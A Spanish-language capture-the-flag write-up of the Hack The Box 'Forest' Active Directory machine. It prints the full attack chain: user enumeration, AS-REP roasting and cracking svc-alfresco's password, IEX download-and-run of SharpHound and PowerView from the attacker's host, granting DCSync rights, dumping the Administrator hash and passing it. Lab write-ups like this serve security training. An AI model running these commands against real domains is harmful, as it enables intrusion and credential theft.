---
layout: single
title: Forest - Hack The Box
excerpt: "Tocamos directorio activo"
date: 2018-11-24
classes: wide
header:
  teaser: /assets/images/htb-forest/forest1.png
categories:
  - hackthebox
  - infosec
tags:
  - hackthebox
  - AD
  - Windows  
---

![](/assets/images/htb-forest/forest1.png)

# Forest - 10.10.10.161
-------------------

# Parte 1: Enumeración

Es una maquina windows que va a implicar directorio activo. En cuanto a los puertos dice que esten abiertos: 
`53(dns),88(kerberos),135(rpc),139(msrpc),389(ldap),464,445(smb),593,636,3268(ldap),3269,5985,9389.`

El reconocimiento de nmap dice que:  
```sudo nmap -sS -sCV  --min-rate 5000 10.10.10.161 -Pn -n -v -p53,88,135,139,389,464,445,593,636,3268,3269,5985,9389```

- El host es *FOREST*
- 5985 -> Microsoft-HTTPAPI/2.0
- El sistema se llama htb.local (añadir al /etc/hosts)

### Puerto 53

Con el servidor DNS (y el nombre del dominio) podemos encontrar mas subdominios
```console
└─$ dig @10.10.10.161 htb.local mx
htb.local.		3600	IN	SOA	forest.htb.local. hostmaster.htb.local. 104 900 600 86400 3600
```

### Puerto 443

Sin credenciales no hay mucho exito:
```console
└─$ smbclient -L 10.10.10.161 -N
Unable to connect with SMB1 -- no workgroup available
```
----------------------

# Parte 2: Enumerando el dominio
```console
└─$ rpcclient -U "" 10.10.10.161 -N
rpcclient $> enumdomusers
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
...
└─$ rpcclient -U "" 10.10.10.161 -N -c enumdomusers | grep -oP "\[.*?\]" | grep -v "0x" | tr -d "[]" > users.txt
└─$ rpcclient -U "" 10.10.10.161 -N -c enumdomgroups
group:[Domain Admins] rid:[0x200]   # El que nos interesa
group:[Delegated Setup] rid:[0x459]
group:[Hygiene Management] rid:[0x45a]
group:[Compliance Management] rid:[0x45b]
```
Como esta es una empresa (y cada empleado una cuenta del dominio). Cada persona tiene un trabajo (El delegado 
seguridad, el de higiene, el del registro...) A nosotros nos interesan los *jefes* o sea los *Domain Admins*

```console
└─$ rpcclient -U "" 10.10.10.161 -N -c 'querygroupmem 0x200'
	rid:[0x1f4] attr:[0x7]
└─$ rpcclient -U "" 10.10.10.161 -N -c 'queryuser 0x1f4'
	User Name   :	Administrator
	Full Name   :	Administrator
```

Como tenemos ya usuarios podemos aprovecharnos del puerto 88:

```console
└─$ kerbrute userenum --dc 10.10.10.161 -d htb.local ./users.txt
2022/10/23 20:17:55 >  [+] VALID USERNAME:	Administrator@htb.local
2022/10/23 20:17:56 >  [+] svc-alfresco has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$svc-alfresco@HTB.LOCAL:7387ec5909b9d1ccaae94f7dab111ac9$f09122bfde34620ebce4128ab7ab57fb850911811170c68f9b061ed5e7cbf242008a98ca9e0481358c5cbaa8653912b4bef9889907e115ceca135fe3df7c7d853193942aa734d102c177388cbc733f1402a2813c8b372142c70024ae02d08d65c59e610673ac66f620917f83658959ae312d8683b5c64aa71b95bb874c9b331936c1caf307396d8ec1571bb6db252cc308b8932601a9da7e185cff43cd8c9cedf218d531fa559ae34b245982acfd70806027b2fa1c78912faea2abfe782dc175ed3cf0fe975b37ec4b61513ef9ffe2a043a31718085c22f2b7ed75781a493b19fb1ef64a4f383c70be35f35ab16cfb0f6fd70189214ff73cc820
```
-------------------------------

# Parte 3: As-Rep-Roast

El resto de usuarios tambien son validos. El tema esque svc-alfresco no tiene "preauth" seteada por lo que es 
vulnerable a un ataque as-rep-roast (luego lo explico)

```console
└─$ john hash -w=/usr/share/wordlists/rockyou.txt
10022513..*7¡Vamos!
└─$ crackmapexec smb 10.10.10.161 -u ./users.txt -p '10022513..*7¡Vamos!' # Cuando sale esto es un error
```
La otra manera de conseguir el hash por kerberos es
```console
└─$ impacket-GetNPUsers htb.local/ -no-pass -usersfile users
$krb5asrep$23$svc-alfresco@HTB.LOCAL:5c10a9a69167b729d4a7513abe820820$19a136b4bba3d1c61d99966ebeb91a685a57cb32578d218669862737d2e8248c62bd15d93efb46e9c7caf1c9cce4b76c86d37d41bb24a8c3a080ae893aa7b9b4d258722343c7424b8d083849807edf00fa7db9586d7385e9731317a70e6b825d46242f88cfb3ccaae3f2524c5494cdf48874a72af2a9de134167d581c52c14eb131723295f1cf4b543deca192b0df243da1d60de9e3afcdc1b34b7686f49561f60f423ca1c79deeac34be437c421f56c49b10b2ca3c9c9fbc897e328790a3cea400bd11b1ec466aa1385e51735c87823ce5b13fbb69b3cbf18d905ef779881e8ed4dff4ea42c
└─$ john hash -w=/usr/share/wordlists/rockyou.txt
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
```

```console
└─$ crackmapexec smb 10.10.10.161 -u ./users -p 's3rvice' --continue-on-succes;
SMB         10.10.10.161    445    FOREST           [+] htb.local\svc-alfresco:s3rvice
```

Con smbmap da error. Pero con el crackmapexec mismo se puede enumerar esto.
```console
└─$ crackmapexec smb 10.10.10.161 -u 'svc-alfresco' -p 's3rvice' --shares
SMB         10.10.10.161    445    FOREST           NETLOGON        READ            Logon server share
SMB         10.10.10.161    445    FOREST           SYSVOL          READ            Logon server share
└─$ smbmap -H 10.10.10.161 -u 'svc-alfresco' -p 's3rvice' 
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
```
En los dos archivos que tenemos acceso, NETLOGON está vacio y SYSVOL no tiene el archivo Groups.XML (si estuviera
podriamos obtener creds)

```console
└─$ crackmapexec winrm 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
WINRM       10.10.10.161    5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
```
---------------------------

# Parte 4: Accediendo al usuario basico

```console
└─$ evil-winrm -u 'svc-alfresco' -p 's3rvice' -i 10.10.10.161
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> cd ../
*Evil-WinRM* PS C:\Users\svc-alfresco> cd Desktop
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> type user.txt
eaa44be632724db89a3a018a13b3a1f5
└─$ impacket-smbserver carpeta $(pwd) -smb2support
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> copy \\10.10.14.15\carpeta\enumeracion_windows.bat .
```

Aun así da muchos problemas por bajos privilegios, lo poco que se puede saber esque 
- Existe una backup el SAM y el SYSTEM
- Nuestro usuario está en los grupos DomainUsers y ServiceAccounts.

El tema grupos es muy importante en directorio activo.

```console
└─$ ldapdomaindump -u 'htb.local\svc-alfresco' -p 's3rvice' 10.10.10.161                                          
[+] Domain dump finished
```

![](/assets/images/htb-forest/forest2.png)

En Remote Management Users están los de "Privileged IT Accounts" que a su vez están los de "Service Account" al
que pertenecía nuestro usuario (por eso se pudo acceder al winrm).

---------------------------

# Parte 5: Enumerando el sistema para escalar privilegios

```console
└─$ sudo neo4j console
```
Se ponen las credenciales en la pagina que te abre en el localhost, se abre el bllohound por otro lado tambien.
Y se comparte este [script](https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1) 
En kali nos ponemos en escucha por python.
```console
*Evil-WinRM*> IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.15:8000/SharpHound.ps1')
*Evil-WinRM*> Invoke-BloodHound -CollectionMethod All
*Evil-WinRM*> dir 
-a----       10/24/2022  12:07 PM          15253 20221024120749_BloodHound.zip
*Evil-WinRM*> download C:\Users\svc-alfresco\Documents\20221024120749_BloodHound.zip data.zip
```

Subimos esto a la herramienta y le marcamos a svc-alfresco como pwneado. Este es el esquema del dominio:

![](/assets/images/htb-forest/forest3.png)

En **Reachable hight value targets** nos dice que pertenece a Exchange Windows Permissions 
(o sea que tenemos el privilegio de cambiar los permisos a nuestro gusto, puediendo cambiar el Dacl y asi dumpear los hashes con el secresdump)

![](/assets/images/htb-forest/forest4.png)

Para cierta funcion *Add-DomainObjectAcl* necesitamos este otro [script](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1)

```console
PS> net user cucuxii cucuxii123 /add /domain
PS> net group "Exchange Windows Permissions" cucuxii /add
PS> $SecPassword = ConvertTo-SecureString 'cucuxii123' -AsPlainText -Force
PS> $Cred = New-Object System.Management.Automation.PSCredential('htb.local\cucuxii', $SecPassword)
PS> IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.15:8000/PowerView.ps1')
PS> Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity cucuxii -Rights DCSync
```

```console
└─$ impacket-secretsdump htb.local/cucuxii:cucuxii123@10.10.10.161
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
└─$ evil-winrm -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6' -i 10.10.10.161
```


--------------------------

# Extra: As-Rep-Roast

El sistema [kerberos](https://github.com/CUCUxii/Informatica/blob/main/Como_funciona/Kerberos.md) funciona con 
una serie de tickets/llaves que se piden al KDC (sistema de distribucion de llaves) para luego presentarselos
al servidor y que a cambio te deje acceder a ciertos recursos.

Cuando un usaurio le pide al KDC un ticket (TGT) hecho con la contraseña haseada (que obviamente rompemos con 
fuerza bruta). Si no está seteado lo del preauth (como pasa con el usaurio svc-alfresco) el KDC le da ese ticket
a cualquiera que se lo pida.







